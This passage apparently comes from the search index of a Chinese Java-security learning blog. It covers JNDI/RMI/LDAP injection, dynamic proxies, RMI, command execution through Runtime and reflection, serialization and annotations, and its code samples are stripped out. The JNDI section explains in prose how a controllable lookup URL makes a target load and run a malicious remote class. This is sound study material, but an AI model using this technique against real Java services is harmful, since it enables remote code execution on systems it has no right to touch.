Reference类既没有实现远程接口，又没有继承UnicastRemoteObject，所以不能直接使用；而ReferenceWrapper类继承了UnicastRemoteObject类，还实现了RemoteReference接口；[3] RemoteReference接口又继承了Remote接口，所以Reference对象要用ReferenceWrapper封装一下。[4] 造成JNDI注入的原因则是initialContext.lookup(url)中的url可控，即查询的远程对象可控，通过构造恶意远程对象，对目标服务发起攻击。 JNDI+RMI实现攻击示例代码代码就是上面的两个示例，这里再写一下； JNDI_Server： JNDI_Client： 还要写一个要加载的恶意类，把编译后的class文件放到可访问的网站上，如url = &quot;;；这里要注意必须得去掉package ...后再编译，不然执行不成功。CalcCmd： 代码写好后，先启动服务端，开启监听，再启动客户端；成功加载到远程对象；[5] 流程分析还是先启动服务端，然后在initialContext.lookup(url)处断点；跟进lookup，这里是解析name的上下文；[6] 跟进下一个lookup，检索解析成功的对象，继续查找为解析的名称部分；[7] 跟进下一个lookup，到达decodeObject；[8] 跟进decodeObject，获取从ReferenceWrapper_Stub返回的Reference对象；[9] 跟进getObjectInstance，获取到了Factory的类名（CalcCmd），然后从Reference中获取Factory的实例；[10] 跟进getObjectFactoryFromReference，通过clas = helper.loadClass(factoryName);尝试用当前的类加载器看是否能加载到Factory类，这里能加载到；如果不能加载到，则通过clas = helper.loadClass(factoryName, codebase);进行远程加载；[11] 分别跟进看一下，如果在本地能加载到，就直接获取Factory类对象；[12] 如果不能加载到，就使用URLClassLoader从指定地址远程动态加载；[13] 最后如果(clas != null)，就实例化加载到的类，而这里加载到的类就是CalcCmd，实例化后即可执行类里面的代码。[14] 调用栈如下：[15] JNDI+LDAP实现攻击示例代码和RMI差不多，先起一个LDAP服务； 模拟一个客户端： 同样需要放一个编译后的恶意class文件在可访问的网站上； 启动服务端后再启动客户端，命令执行成功； 参考链接："},{"title":"Java 动态代理","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","categories":[[" ",""]],"content":"概述代理模式：代理模式是Java常用的一种结构型设计模式，给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。代理类主要负责为被代理类（真实对象）预处理消息、过滤消息，然后将消息传递给被代理类，之后还能对消息进行后置处理。代理类不实现具体服务，而是通过调用被代理类中的方法来完成服务，并将执行结果封装处理。 通过代理对象访问目标对象可以在实现目标对象的基础上，又在不改变目标对象方法的情况下，对方法进行增强，即扩展目标对象的功能。 根据字节码的创建时机来分类，可以分为静态代理和动态代理： 静态代理： 在程序运行前就已经存在代理类的字节码文件，代理类与被代理类的关系在运行前就确定了。 动态代理： 代理类是在程序运行期间由JVM根据反射等机制动态生成的，程序运行前并不存在代理类的字节码文件。 静态代理定义一个接口： 定义一个被代理类，即目标对象，实现这个接口及其抽象方法： 创建代理类，实现与目标对象相同的接口，引用代理对象，调用该对象的方法，还可添加其他功能： 测试类，通过代理对象调用方法，进而调用目标对象的方法，然后将结果返回： 程序运行结果：[1] 静态代理的缺点： 由于代理类需实现与目标对象相同的接口，当有多个需被代理的类时，只有两种方法： 只创建一个代理类，这个代理类同时实现多个接口及其抽象方法，但是会导致代理类过于庞大； 创建多个代理类，每个代理类对应一个被代理类，但是会长生过多代理类； 当接口需要增加、删除、修改方法时，被代理类和代理类的代码都要修改，代码量过大，不易维护。 JDK动态代理接口和被代理类不变，创建一个调用处理器ProxyHandler类，并实现InvocationHandler接口； invoke的三个参数： proxy：被代理的对象 method：调用的方法 args：方法中的参数 动态代理测试类： 程序运行结果：[2] 动态代理实现步骤： 通过实现 InvocationHandler 接口创建自己的调用处理器； 通过为 Proxy 类指定 ClassLoader 对象和一组 interface 来创建动态代理类； 通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型； 通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。 代理对象生成过程代理对象的生成使用了java.lang.reflect.Proxy类的newProxyInstance方法，看一下源码： 再看看生成代理类的getProxyClass0； 继续跟ProxyClassFactory， 生成代理类的字节码文件用到了generateProxyClass，跟进： 使用generateClassFile()方法生成代理类的字节码文件，跟进： 生成字节码文件后，调用defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);解析字节码文件，进而生成代理对象。 参考链接："},{"title":"Java RMI","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20RMI/","categories":[[" ",""]],"content":"概述定义：RMI全称 **远程方法调用(Remote Method Invocation)**，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。Java RMI： 用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。 组成部分：RMI由三部分组成： RMI Registry：JDK提供的一个可独立运行的程序（bin目录下）； RMI Server：服务端程序，对外提供远程对象，代码在这里执行，将执行结果返回给客户端； RMI Client：客户端程序，想要调用远程对象的方法。 示例1. 定义远程接口首先定义一个远程接口，该接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；定义一个sayHello()方法供远程调用，这个方法必须抛出java.rmi.RemoteException异常； 在Java中，Remote接口用于标识其方法可从非本地虚拟机调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”中指定的那些方法是远程可用的。 2.定义远程接口实现类定义一个类来实现远程接口ServiceInterface，并且需要继承java.rmi.server.UnicastRemoteObject；实现类里面必须要定义一个显式构造函数，并且抛出java.rmi.RemoteException异常；实现sayHello()方法，可以添加一个@Override注解，避免出错； 远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。 3. 服务端注册远程对象，向客户端提供远程对象服务； 远程对象是在远程服务上创建的，无法准确的知道远程服务器上的对象的名称，不过将远程对象注册到RMI Registry之后，客户端就可以通过RMI Registry请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了。 4. 客户端客户端向服务端请求远程对象服务； 从RMI Registry中请求stub，如果RMI Registry在本地机器上，url就是rmi://localhost:port/绑定名，如果在远程机器上url就是rmi://RMI Service_IP:port/绑定名； 5. 远程方法调用过程首先启动RMIService，对指定端口进行监听；然后RMIService将自己提供的服务的实现类注册到RMIRegistry上，并指定一个访问路径；最后启动RMIClient，客户端通过本地接口和事先约定好的路径到RMIRegistry上去拿到实现类，所有的方法都在接口里，便可以任意调用远程对象的方法了。 调用结果如下：[1] 参考链接："},{"title":"Java 命令执行","date":"2022-09-19T11:27:30.000Z","url":"/2022/09/19/Java%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","categories":[[" ",""]],"content":"Runtime类测试代码 实现过程补充：Runtime类的exec的重载方法： public Process exec(String command) throwsIOException public Process exec(String command,String[] envp) public Process exec(String command,String[] envp, File dir) public Process exec(String cmdarray[])throws IOException 跟进一下getRuntime方法，该方法直接返回currentRuntime对象，而currentRuntime对象是上面Runtime的实例化对象；也就是说每次调用getRuntime()方法都会实例化一个Runtime对象。[1] 再跟一下exec方法，该方法又返回了一个exec方法；[2] 继续跟，该方法又返回了一个exec方法；[3] 继续跟，new了一个ProcessBuilder对象，调用了start方法；[4] 跟进start方法，该方法又执行了ProcessImpl类中的start静态方法；[5] 继续跟，后面new了一个ProcessImpl的对象；[6] 跟进ProcessImpl，444行创建了一个subprocess，也就是在这里，命令成功执行；[7] 调用流程： public Process exec(String command) public Process exec(String command, String[] envp, File dir) public Process exec(String[] cmdarray, String[] envp, File dir) ProcessBuilder.start() ProcessImpl.start() new ProcessImpl creat()最后返回的就是一个ProcessImpl对象。 反射调用Runtime如果不利用反射执行命令，当需要执行多个命令时，就显得很复杂繁琐，这时候就可以使用反射。 测试代码： 程序运行结果：[8] ProcessBuilder类从上面分析Runtime的实现流程可以知道，执行命令的过程中调用了ProcessBuilder的start方法，那么我们直接实例化ProcessBuilder的对象，调用start方法； 测试代码： [9] ProcessImpl类同样，上面两种类执行命令的过程中都调用了ProcessImpl类的start方法，但是该类是私有的，不能直接实例化，可以通过反射的方式调用； 测试代码： 程序运行结果：[10] 参考链接："},{"title":"Java反射","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%8F%8D%E5%B0%84/","categories":[[" ",""]],"content":"概述反射：框架设计的灵魂 框架：半成品软件；可以在框架的基础上进行软件开发，简化编码。 反射：将类的各个组成部分封装为其他对象。 下面大概介绍一下Java代码在计算机中经历的三个阶段： 第一阶段——Source源代码阶段：首先写一个类文件Person.java，类里面可以写一些成员变量、构造方法、成员方法等；经过javac编译后在硬盘上生成一个字节码文件Person.class，里面保存了成员变量、构造方法、成员方法等； 第二阶段——Class类对象阶段通过类加载器把字节码文件加载到内存里，内存中有一个Class 类对象（描述所有字节码文件的共同特征和行为），将成员变量封装为Field[ ]对象，构造方法封装为Constructor[ ]对象，成员方法封装为Method[ ]对象 第三阶段——Runtime运行时阶段new一个Person对象[1] 反射的好处： 可以在程序运行过程中，操作这些对象； 可以降低程序的一些耦合性，提高程序的可扩展性。 获取Class对象三种方式 Class.forName(&quot;全类名&quot;)：将字节码文件加载进内存，返回Class对象； 多用于配置文件，将类名定义在配置文件中；读取文件，加载类。 类名.class：通过类名的属性class获取； 多用于参数的传递。 对象.getClass()：getclass()方法在Object类中定义； 多用于对象的获取字节码的方式。 示例代码在cn.blckder02.domain下创建一个Person类，定义两个成员变量：[2] 再创建一个student类，作对比，暂时不用写内容；在cn.blckder02.reflect下创建一个ReflectDemo1类，分别用以上三种方法获取Class对象，代码如下： 程序运行结果如下，前两个比较都为true，说明同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个；第三个比较为false，说明每个字节码文件对应的Class类对象都不相同。[3] 使用Class对象Class对象的获取功能 获取成员变量们 Field[ ] getFields() 获取所有public修饰的成员变量 Field getField(String name) 获取指定名称public的成员变量 Field[ ] getDeclaredFields() 获取所有成员变量，不考虑修饰符 Field getDeclaredField(String name) 获取所有指定名称的成员变量，不考虑修饰符 获取构造方法们 Constructor&lt;?&gt;[ ] getConstructors() 获取所有public修饰的构造方法 Constructor getConstructor(类&lt;?&gt;… parameterTypes) 获取指定名称public的构造方法 Constructor&lt;?&gt;[ ] getDeclaredConstructors() 获取所有构造方法，不考虑修饰符 Constructor getDeclaredConstructor(类&lt;?&gt;… parameterTypes) 获取所有指定名称的构造方法，不考虑修饰符 获取成员方法们 Method[ ] getMethods() 获取所有public修饰的成员方法 Method getMethod(String name, 类&lt;?&gt;… parameterTypes) 获取指定名称public的成员方法 Method[ ] getMethods() 获取所有成员方法，不考虑修饰符 Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) 获取所有指定名称的成员方法，不考虑修饰符 获取类名 String getName() 示例1. 获取成员变量们在Person类中按如下属性添加a、b、c、d四个成员变量，并重新设置toString()方法； 获取成员变量后可做操作： 设置值：void set(Object obj, Object value) 获取值：get(Object obj) 忽略访问权限修饰符的安全检查：setAccessible(true)（暴力反射） 在cn.blckder02.reflect下创建ReflectDemo2类，代码如下： 由于getFields()只能获取public修饰的成员变量，所以第一个只输出a；而getDeclaredFields()能获取所有成员变量，所以输出每个成员变量；getDeclaredField(String name)不能直接访问私有成员变量，但是可以使用setAccessible()方法，忽略访问权限修饰符的安全检查来访问。程序运行结果如下：[4] 2. 获取构造方法们getConstructors()方法同样只能获取public修饰的构造方法。构造方法的名称都与类名相同，唯一的区别就是参数不同，所以在获取带参构造方法时要传入相应的参数。通过构造器来创建对象，需要用到newInstance()方法；如果使用空参构造方法创建对象，可以直接使用Class对象的newInstance()方法，简化代码，获取到的结果是一样的。同样可以通过暴力反射setAccessible()方法获取私有构造方法。 在cn.blckder02.reflect下创建ReflectDemo3类，代码如下： 程序运行结果如下：[5] 3. 获取成员方法们在person类中添加一个空参成员方法eat()，一个带参成员方法eat(String food)： 指定名称获取成员方法时，需要传入方法名以及参数。执行方法时，需要用到invoke()方法，要传入方法对象和实际的参数列表； 获取所有public修饰的成员方法时，不仅会得到自己设置的几个方法，还有Object类、父类等的方法。调用方法的getName()可以获取到方法名称。同样可以通过暴力反射setAccessible()方法获取私有成员方法。 在在cn.blckder02.reflect下创建ReflectDemo4类，代码如下： 程序运行结果如下：[6] 4. 获取类名调用类的getName()方法，获取到的是全类名；[7] 案例目的： 写一个类似“框架”的程序，在不改变程序任何代码的情况下，我们可以创建任意类对象，并执行其中方法。可以通过写配置文件和反射技术来实现；步骤： 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 在程序中加载读取配置文件 使用反射技术来加载文件进内存 创建对象 执行方法 示例代码：配置文件config，类名参数值要写全类名： 测试程序ReflectTest.java： 程序运行结果：[8] 在不改动ReflectTest.java代码的情况下，修改配置文件，来调用student类中的sleep方法；[9] 此时程序运行结果：[10] 这就是框架的基本形式，只用修改少量地方，就能实现多种方法；而反射就是去获取我们看不见的构造器、对象、方法等。 参考链接："},{"title":"Java序列化与反序列化","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[[" ",""]],"content":"概述什么是序列化和反序列化：Java 序列化：把Java对象转换为字节序列的过程；Java 反序列化：把字节序列还原为Java对象的过程； 对象序列化的两种用途： 把对象的字节序列永久的保存到硬盘上，通常放到一个文件中； 在网络上传输对象的字节序列； 当大量用户访问Web服务器时，就会创建大量Session对象，占据大量内存资源，于是Web服务器就会把一些Session对象序列化存放到硬盘中，需要使用的时候再将字节序列反序列化为对象到内存中；由于两个进程之间的通信时，数据是以二进制形式进行传输，所以发送方需要把Java对象序列化为字节序列，才能再网络上传输，接收方则把收到的字节序列反序列化为对象。 Java类库中的序列化相关APIjava.io.Serializable接口Java类通过实现java.io.Serializable接口来启用序列化功能。没有实现此接口的类无法使其任何状态序列化或反序列化；实现了该接口的可序列化类的所有子类型本身都是可序列化的；序列化接口没有方法或字段，仅用于标识可序列化的语义。 ObjectOutputStream类：序列化流作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为序列化，可实现对象的持久存储。特有成员方法：writeObject(Object obj)将指定的对象写入 ObjectOutputStream；writeObject 方法用于将对象写入流中。所有对象（包括 String 和数组）都可以通过 writeObject 写入。 ObjectInputStream类：反序列化流作用：将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象，称为反序列化。特有成员方法：Object readObject()从 ObjectInputStream 读取对象。 java.io.Externalizable接口 示例java.io.Serializable创建一个Person类，需要实现Serializable接口； transient关键字可以使被声明的变量不被序列化到文件中，当反序列化时，transient变量的值恢复为初始值，即int型是0，对象型是null； 创建一个SerializeDemo1类来实现序列化和反序列化； 程序运行结果如下，生成了per.txt，保存序列化后的数据：[1] java.io.ExternalizableJava还提供了另一个序列化接口java.io.Externalizable，下面来看看与java.io.Serializable的区别；将Person类改为实现java.io.Externalizable接口，该接口继承了java.io.Serializable接口，并且有两个抽象方法writeExternal()和readExternal()； 程序运行结果如下：[2] 反序列化后所有参数的值都恢复成了默认值，意味着对象的状态并没有被持久化下来；这就是Serializable接口与Externalizable接口的区别，通过Serializable接口对对象序列化的支持是内建于核心 API 的，但是java.io.Externalizable的所有实现者必须提供读取和写出的实现；也就是要实现writeExternal()和readExternal()方法； 实现两个抽象方法： 实现后，程序运行结果如下：[3] 静态变量的序列化示例代码：在Person类中添加一个静态变量： 在SerializeDemo1类中修改并输出静态变量，其他不变； 最后静态变量的输出结果是修改后的值18；[4] 按道理反序列化时读取的staticVar应该是序列化时保存的状态20才对，试验结果却不是这样；那是因为静态变量是属于类的状态，而序列化只保存对象的状态，所以序列化时并不保存静态变量，因此静态变量输出值为18； serialVersionUID即序列化版本号，是Java程序运行时环境根据类的内部细节自动生成的；该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类。如果接收者加载的该对象的类的 serialVersionUID 与对应的发送者的类的版本号不同，则反序列化将会导致 InvalidClassExceptio。如果对类的源代码进行了修改，再重新编译，新生成的类文件的serialVersionUID的取值有可能也会发生变化。类的serialVersionUID的默认值完全依赖于Java编译器的实现，对于同一个类，用不同的Java编译器编译，有可能会导致不同的 serialVersionUID，也有可能相同。为了提高serialVersionUID的独立性和确定性，强烈建议在一个可序列化类中显示的定义serialVersionUID，为它赋予明确的值。 小结 Java类只有实现Serializable接口或Externalizable接口才可启用序列化功能； 当一个对象被序列化时，只保存对象的非静态成员变量； 如果一个对象发成员变量是一个对象，那么这个对象的数据成员也会被序列化； 使用transient关键字声明不需要被序列化的变量； 如果父类实现序列化，那么子类就自动实现序列化，不需要再显式实现Serializable接口； 显式定义serialVersionUID。 参考链接："},{"title":"Java注解","date":"2022-09-19T11:25:30.000Z","url":"/2022/09/19/Java%E6%B3%A8%E8%A7%A3/","categories":[[" ",""]],"content":"概述什么是注解？跟注释一样吗？注解和注释可不一样，注释是用文字描述、解释程序，是给程序员看的，为了让程序员更快速的了解程序功能；而注解是一种代码级别的说明，用来说明程序，是给计算机看的，可理解为给程序贴上了一个标签。 百度百科是这样解释的： 注解，可以看作是对 一个 类&#x2F;方法 的一个扩展的模版，每个 类&#x2F;方法 按照注解类中的规则，来为 类&#x2F;方法 注解不同的参数，在用到的地方可以得到不同的 类&#x2F;方法 中注解的各种参数与值； 从JDK5开始，java增加了对元数据（描述数据属性的信息）的支持。其实说白就是代码里的特殊标志，这些标志可以在编译，类加载，运行时被读取，并执行相应的处理，以便于其他工具补充信息或者进行部署。 使用格式：@注解名称[(属性值)] 作用分类： 编写文档：通过代码里标识的元数据生成文档【生成文档doc文档】 代码分析：通过代码里标识的元数据对代码进行分析【使用反射】 编译检查：通过代码里标识的元数据让编译器能够实现基本的编译检查【Override】 这里简单演示一下生成文档：新建一个类，里面写一个add()方法，并且添加了一些文档注释，文档注释里面又使用了一些注解；这些注解可以被抽取到Javadoc文档中；[1] 将AnnoDemo1.java文件单独保存到一个文件夹中，在命令行中执行javadoc AnnoDemo1.java，就生成了许多html文档；[2] 打开index.html，里面就可以看到我们创建的类和方法的信息，包括我们写的文档注释和使用的注解。[3] 后面两种作用下面慢慢演示。 内置注解在java.lang包中，可理解为JDK中预定义的一些注解； 内置注解有以下五类：1. @Override检测被该注解标注的方法是否是继承自父类（接口）的，可以确保子类确实重写了父类的方法，避免出现低级错误； 添加一个toString()方法，这个方法使用了 @Override注解，那么就要检测这个toString()方法是否与Object类中的toString()方法相同；如果相同则没有报错；[4] 如果不同则报错说这个方法不是来自它的父类；[5] 2. @Deprecated表示该注解标注的内容已过时，但是仍然可以调用，只不过会出现删除线； 先写了一个show1()方法，没过多久，发现这个show1()方法有缺陷，于是又新写了一个show2()方法，从而给show1()方法添加了@Deprecated注解，表示不建议使用该方法了；如果非要使用show1()方法，就会出现删除线；那为什么不删除show1()方法呢？因为还会存在有用户使用低版本的环境，删掉就不兼容了。[6] 3. @SuppressWarnings取消被该注解标注的元素及其子元素编译器显示的警告（消除警告）； 没有添加注解前，会出现许多这样的警告；[7] @SuppressWarnings注解带有一个value属性，所以使用时要给value传值，一般写all，消除所有警告；[8] 一般把@SuppressWarnings添加到定义类的前面，这样该类的所有警告都会消失；[9] 4. “堆污染”警告与@SafeVarargs消除警告； 想理解这个就要明白什么是堆污染，堆污染是什么？就是把不带泛型的对象赋给一个带泛型的对象，为什么不行？因为不带泛型的话，默认会给泛型设定为object，意思就是什么类型都可以往里面塞，那你一个不带泛型的怎么可能给一个带泛型塞呢。 那什么是泛型呢？泛型，顾名思义就是广泛的数据类型，有多广泛，什么数据类型都行；像下面这段代码，在类名后面声明泛型T，那么其中的成员变量、成员方法就可以使用泛型来定义，可以给这个变量传入各种类型的值；[10] 注意：可变参数更容易引发堆污染异常，因为java不允许创建泛型数组，可变参数恰恰是数组。 下面这段代码method方法接受的是一个泛型为Integer类型的Set集合，而main方法中，将一个没有泛型的set对象传给method方法时，则可能造成堆污染，出现警告；[11] 抑制这个警告的方法有三个: @SafeVarargs修饰引发该警告的方法或构造器 使用@suppressWarnings(“unchecked”) 编译时使用-Xlint:varargs [12] 5. 函数式接口与@Functionallnterface用于检查我们写的接口是否与函数式接口定义时的相符合； 什么是函数式接口？一个接口，这个接口里面只能有一个抽象方法； 定义一个接口，里面定义一个抽象方法，用@FunctionalInterface注解，没有报错；[13] 如果在里面定义两个抽象方法，就会出现报错。[14] 元注解在java.lang.annotation包下，可以标注注解的一些注解； 元注解有以下五种：1. @Retention当它标注到一个注解上时，它的属性就是该注解的存活时间； @Retention有一个属性，有以下三种取值： RetentionPolicy.SOURCE：注解只在源码阶段保留，在编译器进行编译时它将被丢弃忽视； RetentionPolicy.CLASS：注解只被保留到编译进行的时候，它并不会被加载到 JVM 中； RetentionPolicy.RUNTIME：注解可以保留到程序运行的时候，它会被加载进入到 JVM 中，所以在程序运行时可以获取到它们。使用格式：@Retention(RetentionPolicy.SOURCE) 2. @Documented能够将被@Documented标注的类中的注解提取到Javadoc中去。 3. @Target指定被标注的注解运用的地方； @Target有一个属性，有以下几种取值，可选用多个值，用逗号隔开： ElementType.ANNOTATION_TYPE 可以给一个注解进行注解 ElementType.CONSTRUCTOR 可以给构造方法进行注解 ElementType.FIELD 可以给属性进行注解 ElementType.LOCAL_VARIABLE 可以给局部变量进行注解 ElementType.METHOD 可以给方法进行注解 ElementType.PACKAGE 可以给一个包进行注解 ElementType.PARAMETER 可以给一个方法内的参数进行注解 ElementType.TYPE 可以给一个类型进行注解，比如类、接口、枚举使用格式：@Target(ElementType.TYPE,ElementType.PACKAGE) 4. @Inherited如果一个A方法被@Inherited和其他一些注解所标注，B方法继承了A方法，且B方法没有被任何注解标注，那么B方法就自动继承标注A方法的所有注解。 5. @Repeatable先看个例子来： 上面的代码中先定义了一个Persons注解，然后定义了一个Person注解，并且用@Repeatable来注解这个注解，而@Repeatable后面的括号相当于一个容器注解，可以理解为存放其他注解的地方，即Persons，它本身也是一个注解；然后用@Person注解去标注Man方法，可以给@Person注解中的role属性赋值，Man方法在拥有@Person注解的属性的同时，也拥有@Persons注解的属性。 注解的属性注解的属性就相当于接口的抽象方法； 定义一个注解@Person： 当只有一个属性name的时候，使用时可以不带属性名称： 有多个属性时，使用时就必须写明属性名称及值，多个属性之间用逗号隔开： 也可以将属性用default关键字指定为默认值，使用时可写为@Person()： 没有属性时就只用写@Person。 属性的返回类型可以是： 八种基本类型 String类型 Class类型 注解类型 枚举类型 以上五种类型的数组类型 自定义注解看了前面那么多例子，差不多也知道注解该怎么写了；格式： 注解本质上就是一个接口，默认继承java.lang.annotation.Annotation；Annotation是所有注解类型扩展的公共接口，手动扩展这个接口不限定注解类型，且此接口本身不是注解类型。 使用注解使用注解的目的是获取注解中定义的属性值，而注解是通过反射获取的；以Java反射中的ReflectTest.java为例，注解可以用来替换1、2步配置文件的相关操作； 先自定义一个注解@Anno1： 写一个Demo1，定义一个show1方法： 再写一个Demo2，定义一个show2方法： 把ReflectTest.java搬过来，用注解替换配置文件部分的操作，然后通过反射获取类名和方法名，最后执行获取到的方法，代码如下： 程序运行结果：[15] 其中： 意思就是在内存中生成了一个该注解(本质是接口)的子类实现对象，可以理解为下面代码： Anno1Impl 实现了Anno1注解（接口），并且复写了Anno1中的两个方法，返回了使用Anno1注解时两个属性的值；anno.className()调用的className()方法就相当于是调用的Anno1Impl 中的className()方法；anno.methodName()同理。 通过修改使用注解时属性的值，便可以获取到不同的方法； [16] 案例写一个Check注解，用于检测被标注的方法是否出错： 写一个计算器，给每个计算方法前都加上@Check注解： 再写一个TestCheck测试程序，将出现的异常写到bug.txt中： 执行TestCheck.java，输出如下：[17] 只输出了sub和mul方法的计算结果，说明add和div方法出现了异常；查看生成的bug.txt，里面记录了异常信息：[18] 小结 注解是提供数据用来解释程序代码的，是给编译器、解析程序看的； 注解不是程序的一部分，无论添加与否都不影响程序的执行； 注解的提取需要借助于 Java 的反射技术，反射比较慢，所以注解使用时也需要谨慎计较时间成本。 参考链接："}]